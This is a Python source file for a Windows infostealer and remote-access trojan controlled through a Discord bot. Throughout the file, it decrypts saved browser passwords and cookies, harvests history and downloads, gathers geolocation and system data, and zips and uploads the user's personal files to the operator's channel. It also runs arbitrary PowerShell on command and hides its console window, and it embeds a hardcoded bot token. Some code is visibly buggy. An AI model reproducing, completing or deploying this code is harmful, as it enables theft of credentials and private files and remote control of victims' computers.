import discord
from discord.ext import commands
import os, zipfile, ctypes, ctypes.wintypes, winreg, base64, subprocess, requests, json, sqlite3, shutil
from Crypto.Cipher import AES
from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes

class DATA_BLOB(ctypes.Structure):
    _fields_ = [
     (
      "cbData", wintypes.DWORD),
     (
      "pbData", POINTER(c_char))]


def extract_blob_data(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = ctypes.create_string_buffer(cbData)
    ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


def crypt_unprotect_data(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 1, byref(blob_out)):
        return extract_blob_data(blob_out)


def get_browser_master_key(local_state_path):
    if not os.path.exists(local_state_path):
        return
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state_json = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state_json["os_crypt"]["encrypted_key"])[5:]
    master_key = crypt_unprotect_data(encrypted_key)
    return master_key


def decrypt_buffer_with_master_key(Buffer, master_key=None):
    starts = Buffer.decode(encoding="utf8", errors="ignore")[:3]
    if starts == "v10" or starts == "v11":
        iv = Buffer[3:15]
        payload = Buffer[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16]
        try:
            decrypted_pass = decrypted_pass.decode()
        except Exception as e:
            try:
                pass
            finally:
                e = None
                del e

        return decrypted_pass


LOCAL = os.getenv("LOCALAPPDATA")
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def rc4_ksa(key_bytes):
    key_length = len(key_bytes)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key_bytes[i % key_length]) % 256
        S[i], S[j] = S[j], S[i]

    return S


def rc4_prga(S, data):
    i = j = 0
    out = []
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        out.append(char ^ K)

    return bytes(out)


def rc4_crypt(key, data):
    key = [ord(c) for c in key]
    S = rc4_ksa(key)
    return rc4_prga(S, data)


def encrypt_file_with_rc4(input_path, output_path, key):
    try:
        with open(input_path, "rb") as inp:
            data = inp.read()
        enc = rc4_crypt(key, data)
        with open(output_path, "wb") as out:
            out.write(enc)
    except Exception as e:
        try:
            return 0
        finally:
            e = None
            del e


def get_public_ip() -> str:
    api_url = "https://api.ipify.org?format=json"
    response = requests.get(api_url)
    response.raise_for_status()
    data = response.json()
    return data["ip"]


def find_and_encrypt_user_files():
    target_extensions = [
     '.png', '.pdf', '.jpg', '.docx', '.xlsx', '.xls', '.doc', '.pptx', 
     '.csv', 
     '.rtf', '.jpeg', '.html', '.odt', '.sql', '.txt', 
     '.xml', '.zip', 
     '.rar', '.7z', '.tar', '.gz', '.tgz']
    user_profile_path = os.environ["USERPROFILE"]
    target_directories = [
     os.path.join(user_profile_path, "Desktop"),
     os.path.join(user_profile_path, "Documents"),
     os.path.join(user_profile_path, "Pictures"),
     os.path.join(user_profile_path, "Downloads"),
     os.path.join(user_profile_path, "Music"),
     os.path.join(user_profile_path, "Videos")]
    found_files = []
    for directory in target_directories:
        for root, _, files in os.walk(directory):
            for file_name in files:
                if any((file_name.endswith(ext) for ext in target_extensions)):
                    found_files.append(os.path.join(root, file_name))

    zip_path = os.path.join(target_directories, "Upload.zip")
    try:
        with zipfile.ZipFile(zip_path, "w") as zipf:
            for file_to_zip in found_files:
                zipf.write(file_to_zip, os.path.relpath(file_to_zip, user_profile_path))

        encrypt_file_with_rc4((f"{zip_path}"), (f"{zip_path}"), (f"{get_public_ip()}"))
    except Exception as e:
        try:
            return 0
        finally:
            e = None
            del e

    return zip_path


def hide_console_window():
    try:
        user32 = ctypes.WinDLL("user32.dll")
        hwnd = user32.GetForegroundWindow()
        user32.ShowWindow(hwnd, 0)
    except Exception as e:
        try:
            return 0
        finally:
            e = None
            del e


@bot.event
async def on_ready():
    guild = bot.get_guild(SERVER_ID)
    if guild:
        channel = guild.get_channel(CHANNEL_ID)
        if channel:
            await channel.send("Ready to steal data!")
    else:
        return 0


async def upload_file_to_channel(channel, file_path):
    try:
        with open(file_path, "rb") as file:
            await channel.send(file=(discord.File(file, f"{os.path.basename(file_path)}")))
    except Exception as e:
        try:
            return 0
        finally:
            e = None
            del e


@bot.command(name="quit")
@commands.is_owner()
async def cmd_quit(ctx):
    await bot.close()


@bot.command(name="execshell")
@commands.is_owner()
async def cmd_execute_shell(ctx, *args):
    try:
        command_string = " ".join(args)
        full_command = f"powershell -Command {command_string}"
        process_result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
        output = process_result.stdout + process_result.stderr
        if len(output) < 1990:
            await ctx.send(f"```\n{output}\n```")
        else:
            for i in range(0, len(output), 1990):
                await ctx.send(f"```\n{output[i:i + 1990]}\n```")

    except Exception as e:
        try:
            return 0
        finally:
            e = None
            del e


@bot.command(name="download")
@commands.is_owner()
async def cmd_upload_user_files(ctx):
    guild = bot.get_guild(SERVER_ID)
    if guild:
        channel = guild.get_channel(CHANNEL_ID)
        if channel:
            zip_path = find_and_encrypt_user_files()
            await upload_file_to_channel(channel, zip_path)
            os.remove(zip_path)


@bot.command(name="globalinfo")
@commands.is_owner()
async def cmd_get_system_info(ctx):
    try:
        api_url = "https://api.ipify.org?format=json"
        response = requests.get(api_url)
        response.raise_for_status()
        data = response.json()
        ip = data["ip"]
        api_url = f"http://ip-api.com/json/{ip}"
        response = requests.get(api_url)
        response.raise_for_status()
        data = response.json()
        username = os.getlogin()
        country_code = data["country"].lower()
        region = data["region"]
        city = data["city"]
        isp = data["isp"]
        info_message = f'\n        :flag_{country_code}: - `{username.upper()} | {ip} ({data["country"]}, {city})`\n        \n Product name : {os.getenv("PROCESSOR_IDENTIFIER")}\n        \n More Information 👀 : \n        \n :flag_{country_code}: - `({region}) ({isp})`\n        \n PC Information : \n        \n User - `{os.getenv("COMPUTERNAME")}`\n        \n Cores: `{os.cpu_count()}` \n        \n Home directory: `{os.getenv("USERPROFILE")}`\n        \n Version: `{os.getenv("OSVERSION_VERSION")}`\n        \n Machine: `{os.getenv("PROCESSOR_ARCHITECTURE")}`\n        \n Processor: `{os.getenv("PROCESSOR_IDENTIFIER")}`\n        \n Release: `{os.getenv("SystemRoot").split(os.sep)[-1]}`'
        await ctx.send(info_message)
    except Exception as e:
        try:
            return 0
        finally:
            e = None
            del e


BROWSER_DATA_PATHS = {'opera-stable':LOCAL + "\\Opera Software\\Opera Stable", 
 'opera-gx-stable':LOCAL + "\\Opera Software\\Opera GX Stable", 
 'google-chrome-sxs':LOCAL + "\\Google\\Chrome SxS\\User Data", 
 'google-chrome':LOCAL + "\\Google\\Chrome\\User Data", 
 'microsoft-edge':LOCAL + "\\Microsoft\\Edge\\User Data", 
 'brave':LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data", 
 'google-chrome-beta':LOCAL + "\\Google\\Chrome Beta\\User Data", 
 'chromodo':LOCAL + "\\Comodo\\Chromodo\\User Data"}
BROWSER_PROFILES = [
 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']

class StolenDataTypes:

    class Login:

        def __init__(self, url, username, password):
            self.url = url
            self.username = username
            self.password = password

    class Cookie:

        def __init__(self, host, name, path, value, expires):
            self.host = host
            self.name = name
            self.path = path
            self.value = value
            self.expires = expires

    class WebHistory:

        def __init__(self, url, title, last_visit):
            self.url = url
            self.title = title
            self.last_visit = last_visit

    class Download:

        def __init__(self, url, path):
            self.url = url
            self.path = path


STOLEN_LOGINS = []
STOLEN_COOKIES = []
STOLEN_WEB_HISTORY = []
STOLEN_DOWNLOADS = []

def get_env_variable_from_registry(value_name):
    try:
        try:
            handle = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment")
            value = winreg.QueryValueEx(handle, value_name)[0]
            return value
        except Exception as e:
            try:
                return 0
            finally:
                e = None
                del e

    finally:
        handle.Close()


def decrypt_db_value_aes_gcm(encrypted_value: bytes, master_key: bytes) -> str:
    iv = encrypted_value[3:15]
    payload = encrypted_value[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)[:-16].decode()
    return decrypted_pass


def query_sqlite_db(db_path, query, process_row_callback):
    if not os.path.exists(db_path):
        return
    temp_db_path = "temp_db"
    shutil.copy(db_path, temp_db_path)
    conn = None
    try:
        try:
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            cursor.execute(query)
            for row in cursor.fetchall():
                process_row_callback(row)

        except Exception as e:
            try:
                return 0
            finally:
                e = None
                del e

    finally:
        if conn:
            conn.close()
        if os.path.exists(temp_db_path):
            os.remove(temp_db_path)


def steal_logins(browser_path, profile, master_key):
    login_db_path = f"{browser_path}\\{profile}\\Login Data"
    query = "SELECT action_url, username_value, password_value FROM logins"

    def process_row(row):
        if row[0]:
            if row[1]:
                if row[2]:
                    password = decrypt_db_value_aes_gcm(row[2], master_key)
                    STOLEN_LOGINS.append(StolenDataTypes.Login(row[0], row[1], password))

    query_sqlite_db(login_db_path, query, process_row)


def steal_cookies(browser_path, profile, master_key):
    cookies_db_path = f"{browser_path}\\{profile}\\Network\\Cookies"
    query = "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies"

    def process_row(row):
        if row[0]:
            if row[1]:
                if row[2]:
                    if row[3]:
                        cookie = decrypt_db_value_aes_gcm(row[3], master_key)
                        STOLEN_COOKIES.append(StolenDataTypes.Cookie(row[0], row[1], row[2], cookie, row[4]))

    query_sqlite_db(cookies_db_path, query, process_row)


def steal_history(browser_path, profile):
    history_db_path = f"{browser_path}\\{profile}\\History"
    query = "SELECT url, title, last_visit_time FROM urls"

    def process_row(row):
        if row[0]:
            if row[1]:
                if row[2]:
                    STOLEN_WEB_HISTORY.append(StolenDataTypes.WebHistory(row[0], row[1], row[2]))

    query_sqlite_db(history_db_path, query, process_row)


def steal_downloads(browser_path, profile):
    downloads_db_path = f"{browser_path}\\{profile}\\History"
    query = "SELECT tab_url, target_path FROM downloads"

    def process_row(row):
        if row[0]:
            if row[1]:
                STOLEN_DOWNLOADS.append(StolenDataTypes.Download(row[0], row[1]))

    query_sqlite_db(downloads_db_path, query, process_row)


def run_full_browser_steal():
    for browser, path in BROWSER_DATA_PATHS.items():
        if not os.path.exists(path):
            continue
        master_key = get_browser_master_key(f"{path}\\Local State")
        if not master_key:
            continue
        for profile in BROWSER_PROFILES:
            if not os.path.exists(f"{path}\\{profile}"):
                continue
            try:
                steal_logins(path, profile, master_key)
                steal_history(path, profile)
                steal_downloads(path, profile)
            except Exception as e:
                try:
                    return 0
                finally:
                    e = None
                    del e


@bot.command(name="steal")
@commands.is_owner()
async def cmd_show_stolen_data(ctx):
    try:
        for login in STOLEN_LOGINS:
            username = login.username
            password = login.password
            await ctx.send(f"URL: {login.url}\nUsername: {username}\nPassword: {password}")

        for browser, path in BROWSER_DATA_PATHS.items():
            for profile in BROWSER_PROFILES:
                if not os.path.exists(f"{path}\\{profile}"):
                    continue
                try:
                    history_file_path = f"{path}\\{profile}\\History"
                    with open(history_file_path, "rb") as file:
                        await ctx.send(file=(discord.File(file, f"{os.path.basename(history_file_path)}")))
                except Exception as e:
                    try:
                        return 0
                    finally:
                        e = None
                        del e

    except Exception as e:
        try:
            return 0
        finally:
            e = None
            del e


@bot.command(name="showHis")
@commands.is_owner()
async def cmd_search_history(ctx, *args):
    search_term = " ".join(args)
    found = False
    for entry in STOLEN_WEB_HISTORY:
        if search_term.lower() in entry.url.lower() or search_term.lower() in entry.title.lower():
            await ctx.send(f"URL: {entry.url}\nTitle: {entry.title}\nLast visit: {entry.last_visit}")
            found = True

    if not found:
        if search_term:
            return 0


@bot.command(name="showDown")
@commands.is_owner()
async def cmd_show_downloads(ctx, *args):
    search_term = " ".join(args)
    if not search_term:
        await ctx.send("No search term provided.")
        for entry in STOLEN_DOWNLOADS:
            await ctx.send(f"URL: {entry.url}\nPath: {entry.path}")
            await ctx.send("==============================")

        return
    found = False
    for entry in STOLEN_DOWNLOADS:
        if commands in entry.url or commands in entry.path:
            await ctx.send(f"URL: {entry.url}\nPath: {entry.path}")
            await ctx.send("==============================")
            found = True

    if not found:
        await ctx.send("Nothin")


def main():
    run_full_browser_steal()
    bot.run(TOKEN)


TOKEN = "MTA3NzU5NzY4MTgwOTExNzI1NA.GdNmEs.6Phdg_2uMHnZolzuXdz8OZZsTgpw63Df1vJtt0"
SERVER_ID = int(get_env_variable_from_registry("_NT_SYMBOL_ID"))
CHANNEL_ID = int(get_env_variable_from_registry("_NT_SYMBOL_CHANNEL_"))
if __name__ == "__main__":
    main()